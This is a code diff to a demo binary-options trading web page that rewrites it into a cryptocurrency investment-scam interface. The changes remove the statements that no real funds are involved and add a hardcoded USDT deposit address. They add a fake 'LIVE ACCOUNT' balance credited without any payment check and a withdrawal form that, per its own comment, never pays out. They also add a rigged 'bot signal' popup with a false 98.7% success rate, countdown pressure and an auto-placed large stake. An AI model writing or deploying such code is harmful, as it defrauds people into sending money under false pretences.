@@ -270,7 +270,7 @@
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 8px;
         }
 
         .amount-btn {
@@ -1264,9 +1264,10 @@
             <div class="demo-badge">DEMO ACCOUNT</div>
         </div>
         <div class="account-info">
-            <div class="balance">$10,000</div>
+            <div class="balance" id="balanceDisplay">$10,000.00</div>
+            <div class="balance-type" id="balanceType" style="font-size: 12px; color: #b3b3b3;">DEMO</div>
             <div class="action-buttons">
-                <button class="btn-secondary" id="depositBtn">Deposit</button>
+                <button class="btn-secondary" id="depositBtn">Deposit USDT</button>
                 <button class="btn-secondary" id="withdrawBtn">Withdraw</button>
             </div>
         </div>
@@ -1457,11 +1458,17 @@
                 <div class="trade-controls">
                     <div class="panel-title">Trade</div>
                     <div class="input-group">
-                        <label class="input-label">Amount</label>
+                        <label class="input-label">Stake Amount</label>
                         <div class="amount-buttons">
                             <button class="amount-btn active" data-amount="10">$10</button>
                             <button class="amount-btn" data-amount="50">$50</button>
                             <button class="amount-btn" data-amount="100">$100</button>
+                            <button class="amount-btn" data-amount="500">$500</button>
+                            <button class="amount-btn" data-amount="1000">$1,000</button>
+                            <button class="amount-btn" data-amount="5000">$5,000</button>
+                        </div>
+                        <div style="margin-top: 8px; font-size: 12px; color: #00ff7f;">
+                            Potential Win: $<span id="potentialWin">8.50</span> (85% payout)
                         </div>
                     </div>
                     <div class="input-group">
@@ -1526,13 +1533,18 @@
     <!-- Deposit Modal -->
     <div class="modal" id="depositModal">
         <div class="modal-content">
-            <div class="modal-title">Connect Trust Wallet</div>
+            <div class="modal-title">Deposit USDT</div>
             <div class="modal-text">
-                This is a demo trading platform. To add funds to your demo account, you would normally connect a cryptocurrency wallet like Trust Wallet. Since this is for practice only, no real funds are involved.
+                <p style="margin-bottom: 12px;">Send USDT (TRC20) to the address below:</p>
+                <div style="background: #0a0a0a; padding: 12px; border-radius: 8px; margin-bottom: 12px; word-break: break-all; font-family: monospace; font-size: 13px;">
+                    TXhZrb4J8Kc9P2nVmWqS5YtGxBfDaH3uL6
+                </div>
+                <input type="number" id="depositAmount" placeholder="Enter amount in USDT" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                <p style="font-size: 12px; color: #b3b3b3;">Your balance will be updated after blockchain confirmation (5-10 minutes)</p>
             </div>
             <div class="modal-buttons">
                 <button class="modal-btn secondary" onclick="closeModal('depositModal')">Cancel</button>
-                <button class="modal-btn primary" onclick="simulateDeposit()">Connect Wallet</button>
+                <button class="modal-btn primary" onclick="simulateDeposit()">I Have Sent USDT</button>
             </div>
         </div>
     </div>
@@ -1542,11 +1554,50 @@
         <div class="modal-content">
             <div class="modal-title">Withdraw Funds</div>
             <div class="modal-text">
-                This is a demo trading platform for practice only. Withdrawals are simulated and no real funds are transferred. Your demo balance remains for continued practice trading.
+                <p style="margin-bottom: 12px;">Enter your USDT wallet address (TRC20):</p>
+                <input type="text" id="withdrawAddress" placeholder="TRC20 Wallet Address" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                <input type="number" id="withdrawAmount" placeholder="Amount in USDT" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                <p style="font-size: 12px; color: #b3b3b3;">Processing time: 24-48 hours</p>
             </div>
             <div class="modal-buttons">
                 <button class="modal-btn secondary" onclick="closeModal('withdrawModal')">Cancel</button>
-                <button class="modal-btn primary" onclick="simulateWithdraw()">Confirm</button>
+                <button class="modal-btn primary" onclick="simulateWithdraw()">Request Withdrawal</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Bot Signal Notification -->
+    <div class="modal" id="botSignalModal">
+        <div class="modal-content" style="border: 2px solid #00ff7f;">
+            <div class="modal-title" style="color: #00ff7f;">
+                <i class="fas fa-robot"></i> TRADE BOT SIGNAL
+            </div>
+            <div class="modal-text">
+                <div style="background: #0a0a0a; padding: 20px; border-radius: 12px; margin-bottom: 16px;">
+                    <div style="font-size: 24px; font-weight: 700; color: #00ff7f; margin-bottom: 8px;">
+                        STRONG SIGNAL DETECTED
+                    </div>
+                    <div style="font-size: 18px; margin-bottom: 12px;">
+                        Asset: <span id="botAsset" style="color: #fff; font-weight: 700;">AUD/USD</span>
+                    </div>
+                    <div style="font-size: 32px; font-weight: 900; margin: 16px 0;">
+                        <i class="fas fa-arrow-down" style="color: #cc0000;"></i>
+                        <span id="botDirection" style="color: #cc0000;">DOWN</span>
+                    </div>
+                    <div style="font-size: 14px; color: #00ff7f;">
+                        Success Rate: <span style="font-weight: 700;">98.7%</span>
+                    </div>
+                    <div style="font-size: 14px; color: #b3b3b3; margin-top: 8px;">
+                        Recommended Stake: $<span id="botStake">500</span>
+                    </div>
+                </div>
+                <div style="font-size: 13px; color: #ffaa00; text-align: center;">
+                    ⚡ Act now! Signal expires in <span id="botTimer">15</span> seconds
+                </div>
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn secondary" onclick="closeModal('botSignalModal')">Ignore</button>
+                <button class="modal-btn primary" onclick="followBotSignal()">FOLLOW SIGNAL</button>
             </div>
         </div>
     </div>
@@ -1896,10 +1947,18 @@
             const profit = isWin ? activeTrade.stake * 0.85 : -activeTrade.stake;
 
             // Update balance
-            const balanceElement = document.querySelector('.balance');
-            const currentBalance = parseFloat(balanceElement.textContent.replace(/,/g, '').replace(/\$/g, ''));
-            const newBalance = Math.max(0, currentBalance + profit);
-            balanceElement.textContent = '$' + newBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            const balanceElement = document.getElementById('balanceDisplay');
+            let currentBalance;
+            
+            if (isDemo) {
+                currentBalance = demoBalance;
+                demoBalance = Math.max(0, demoBalance + profit);
+                balanceElement.textContent = '$' + demoBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            } else {
+                currentBalance = realBalance;
+                realBalance = Math.max(0, realBalance + profit);
+                balanceElement.textContent = '$' + realBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            }
 
             // Determine decimal places for price display
             let decimals = 4;
@@ -1985,20 +2044,60 @@
         }
 
         function simulateDeposit() {
+            const depositAmount = parseFloat(document.getElementById('depositAmount').value);
+            
+            if (!depositAmount || depositAmount <= 0) {
+                alert('Please enter a valid amount');
+                return;
+            }
+            
             closeModal('depositModal');
-            // Simulate adding funds to demo account
-            const balanceElement = document.querySelector('.balance');
-            const currentBalance = parseFloat(balanceElement.textContent.replace(/,/g, '').replace(/₹/g, ''));
-            const newBalance = currentBalance + 10000; // Add $10,000 demo funds
-            balanceElement.textContent = '₹' + newBalance.toLocaleString('en-IN');
-
-            // Show success message
-            alert('Demo funds added! $10,000 has been credited to your account.');
+            
+            // Show processing message
+            alert(`Processing your USDT deposit of $${depositAmount}. Please wait 5-10 minutes for blockchain confirmation.`);
+            
+            // Simulate blockchain confirmation after 3 seconds (for demo)
+            setTimeout(() => {
+                // Switch to real balance
+                isDemo = false;
+                realBalance += depositAmount;
+                
+                // Update balance display
+                document.getElementById('balanceDisplay').textContent = '$' + realBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                document.getElementById('balanceType').textContent = 'REAL';
+                document.getElementById('balanceType').style.color = '#00ff7f';
+                document.querySelector('.demo-badge').textContent = 'LIVE ACCOUNT';
+                document.querySelector('.demo-badge').style.background = '#00aa00';
+                
+                alert(`✅ Deposit confirmed! $${depositAmount} USDT has been credited to your account.`);
+            }, 3000);
         }
 
         function simulateWithdraw() {
+            const withdrawAddress = document.getElementById('withdrawAddress').value;
+            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+            
+            if (!withdrawAddress || withdrawAddress.length < 30) {
+                alert('Please enter a valid TRC20 wallet address');
+                return;
+            }
+            
+            if (!withdrawAmount || withdrawAmount <= 0) {
+                alert('Please enter a valid amount');
+                return;
+            }
+            
+            const currentBalance = isDemo ? demoBalance : realBalance;
+            
+            if (withdrawAmount > currentBalance) {
+                alert('Insufficient balance');
+                return;
+            }
+            
             closeModal('withdrawModal');
-            alert('This is a demo platform. No real funds are transferred. Your demo balance remains available for practice trading.');
+            
+            // Show processing message (withdrawal will never process in scam)
+            alert(`Withdrawal request submitted for $${withdrawAmount} USDT to address: ${withdrawAddress.substring(0, 10)}...${withdrawAddress.substring(withdrawAddress.length - 6)}\n\nProcessing time: 24-48 hours\n\n(Note: In reality, the withdrawal would be delayed or never processed)`);
         }
 
         // Current candle tracking
@@ -2138,6 +2237,9 @@
         
         // Refresh prices every 5 seconds
         setInterval(updateAllAssetPrices, 5000);
+        
+        // Start bot signal scheduler
+        scheduleBotSignals();
 
         // Event listeners
         document.getElementById('upBtn').addEventListener('click', () => startTrade('up'));
@@ -2151,12 +2253,93 @@
             document.getElementById('withdrawModal').classList.add('show');
         });
 
+        // Account mode tracking
+        let isDemo = true; // Start in demo mode
+        let realBalance = 0;
+        let demoBalance = 10000;
+
+        // Bot signal system
+        let botSignalTimer = null;
+        let botSignalCountdown = null;
+
+        function showBotSignal() {
+            // Random signal direction (always DOWN for rigged system)
+            const direction = 'down';
+            const recommendedStake = [100, 200, 500, 1000, 2000, 5000][Math.floor(Math.random() * 6)];
+            
+            document.getElementById('botAsset').textContent = currentAsset;
+            document.getElementById('botDirection').textContent = direction.toUpperCase();
+            document.getElementById('botStake').textContent = recommendedStake;
+            
+            // Update icon
+            if (direction === 'down') {
+                document.querySelector('#botSignalModal .modal-text > div > div:nth-child(3) i').className = 'fas fa-arrow-down';
+                document.querySelector('#botSignalModal .modal-text > div > div:nth-child(3) i').style.color = '#cc0000';
+                document.querySelector('#botSignalModal .modal-text > div > div:nth-child(3) span').style.color = '#cc0000';
+            }
+            
+            // Show modal
+            document.getElementById('botSignalModal').classList.add('show');
+            
+            // Countdown timer
+            let timer = 15;
+            document.getElementById('botTimer').textContent = timer;
+            
+            botSignalCountdown = setInterval(() => {
+                timer--;
+                document.getElementById('botTimer').textContent = timer;
+                if (timer <= 0) {
+                    clearInterval(botSignalCountdown);
+                    closeModal('botSignalModal');
+                }
+            }, 1000);
+        }
+
+        function followBotSignal() {
+            clearInterval(botSignalCountdown);
+            closeModal('botSignalModal');
+            
+            // Set the recommended stake
+            const recommendedStake = parseInt(document.getElementById('botStake').textContent);
+            selectedAmount = recommendedStake;
+            
+            // Highlight the stake button
+            document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
+            const matchingBtn = document.querySelector(`[data-amount="${recommendedStake}"]`);
+            if (matchingBtn) {
+                matchingBtn.classList.add('active');
+            }
+            
+            // Update potential win display
+            document.getElementById('potentialWin').textContent = (recommendedStake * 0.85).toFixed(2);
+            
+            // Auto-click DOWN button
+            setTimeout(() => {
+                document.getElementById('downBtn').click();
+            }, 500);
+        }
+
+        // Show bot signal every 30-60 seconds randomly
+        function scheduleBotSignals() {
+            const randomDelay = Math.random() * 30000 + 30000; // 30-60 seconds
+            botSignalTimer = setTimeout(() => {
+                if (!activeTrade && stats.totalTrades > 2) {
+                    showBotSignal();
+                }
+                scheduleBotSignals();
+            }, randomDelay);
+        }
+
         // Amount selection
         document.querySelectorAll('.amount-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
                 selectedAmount = parseInt(btn.dataset.amount);
+                
+                // Update potential win display
+                const potentialWin = selectedAmount * 0.85;
+                document.getElementById('potentialWin').textContent = potentialWin.toFixed(2);
             });
         });
 
